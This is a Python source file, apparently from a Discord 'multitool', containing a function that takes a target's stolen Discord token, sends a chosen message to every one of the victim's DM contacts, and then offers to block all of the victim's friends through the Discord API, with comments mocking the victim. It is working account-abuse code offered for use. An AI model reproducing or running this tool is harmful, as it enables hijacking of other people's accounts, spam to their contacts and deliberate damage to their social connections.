# Stellar Multitool is proudly coded by @swedewtf, @rinfys and @crxelty (crxelty is no longer active)
# Multitool maintained/updated by @swedewtf and @rinfys

from colorama import Fore, Style, init
init(convert=True)
import requests
from util.plugins.pluh import slowprint, tokencheck
import time
import Stellar

red = Fore.RED + Style.BRIGHT
green = Fore.GREEN + Style.BRIGHT
blue = Fore.BLUE + Style.BRIGHT
purple = Fore.MAGENTA + Style.BRIGHT
yellow = Fore.YELLOW + Style.BRIGHT
white = Fore.WHITE

def massDM():
    token = input("Enter targets token: ")
    tokencheck(token)
    msg_content = str(input("Enter message to send to every friend: "))
    tokencheck(token)
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
    }
    data = {"content": msg_content} 
    channelIDs = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
    if not channelIDs:
        print("Damn this person's lonely, he aint got no friends LMFAO")
    for channel in [channelIDs[amount : amount + 3] for amount in range(0, len(channelIDs), 3)]:
        for channel in channel:
            for user in [x["username"]+"#"+x["discriminator"] for x in channel["recipients"]]:
                try:
                    requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',headers=headers,json=data)
                    print(f'{green}Sent "{msg_content}" to {user}!')
                except Exception as err:
                    print(f'{red} Oopsie poopsie! An error has occured: {err}')
    slowprint("Done mass-dming everyone!\nWould you like to block all of their friends? [Y]/[N]\n")
    choice = input("Choice: ")
    if choice == "N" or choice == "[N]" or choice == "no" or choice == "No":
        time.sleep(3)
        Stellar.main()
    elif choice == "Y" or choice == "y" or choice == "[Y]" or choice == "yes" or choice == "Yes":
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
        if not friendIds:
            print("Woopsies! This kid has no friends :(")
    count = 1
    headers2 = {
        "Authorization": token,
        "Content-Type": "application/json",
    }
    for friend in [friendIds[amount2 : amount2 + 3] for amount2 in range(0, len(friendIds), 3)]:
        for friend in friend:
                try:
                    requests.put(f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'],headers=headers2,json={"type": 2})
                    print(f'{green}Blocked {count} friend(s) ')
                    count += 1
                except Exception as err2:
                        print(f'{red} Oopsie poopsie! An error has occured: {err2}')